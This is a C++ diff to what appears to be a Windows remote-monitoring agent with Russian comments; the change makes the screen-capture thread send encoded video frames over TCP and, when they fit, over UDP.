@@ -47,7 +47,7 @@ static std::atomic<uint32_t> g_sequence{0};
 // Отправка видеопотока по UDP
 // =============================================================================
 
-void videoStreamThread(SOCKET udpSocket, const sockaddr_in& serverAddr,
+void videoStreamThread(SOCKET tcpSocket, SOCKET udpSocket, const sockaddr_in& serverAddr,
                        net::AgentConfig& config) {
     ScreenCapturer capturer;
     VideoEncoder encoder;
@@ -83,24 +83,30 @@ void videoStreamThread(SOCKET udpSocket, const sockaddr_in& serverAddr,
             // Кодируем
             video::EncodedFrame encoded;
             if (encoder.encodeFrame(rawFrame, encoded)) {
-                if (encoded.data.size() < net::MAX_FRAME_SIZE) {
-                    // Формируем пакет
-                    VideoFrameHeader frameHeader;
-                    frameHeader.clientId  = g_clientId.load();
-                    frameHeader.timestamp = encoded.timestamp;
-                    frameHeader.width     = static_cast<uint16_t>(encoded.width);
-                    frameHeader.height    = static_cast<uint16_t>(encoded.height);
-                    frameHeader.frameType = static_cast<uint8_t>(encoded.type);
-                    frameHeader.quality   = config.quality;
+                // Формируем пакет
+                VideoFrameHeader frameHeader;
+                frameHeader.clientId  = g_clientId.load();
+                frameHeader.timestamp = encoded.timestamp;
+                frameHeader.width     = static_cast<uint16_t>(encoded.width);
+                frameHeader.height    = static_cast<uint16_t>(encoded.height);
+                frameHeader.frameType = static_cast<uint8_t>(encoded.type);
+                frameHeader.quality   = config.quality;
 
-                    auto packet = makeVideoPacket(
-                        frameHeader,
-                        encoded.data.data(),
-                        encoded.data.size(),
-                        g_sequence.fetch_add(1)
-                    );
+                auto packet = makeVideoPacket(
+                    frameHeader,
+                    encoded.data.data(),
+                    encoded.data.size(),
+                    g_sequence.fetch_add(1)
+                );
 
-                    // Отправляем по UDP
+                // 1. Отправляем кадр по TCP (гарантированная доставка через фаервол без ограничения размера)
+                send(tcpSocket,
+                     reinterpret_cast<const char*>(packet.data()),
+                     static_cast<int>(packet.size()),
+                     0);
+
+                // 2. Также отправляем по UDP если размер умещается в датаграмму
+                if (packet.size() <= net::MAX_UDP_PACKET_SIZE) {
                     sendto(udpSocket,
                            reinterpret_cast<const char*>(packet.data()),
                            static_cast<int>(packet.size()),
@@ -426,7 +432,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
         LockManager lockMgr;
 
         // --- Запускаем рабочие потоки ---
-        std::thread videoThread(videoStreamThread, udpSocket, udpServerAddr, std::ref(config));
+        std::thread videoThread(videoStreamThread, tcpSocket, udpSocket, udpServerAddr, std::ref(config));
         std::thread cmdThread(commandThread, tcpSocket, std::ref(injector), std::ref(lockMgr));
         std::thread hbThread(heartbeatThread, tcpSocket);
 
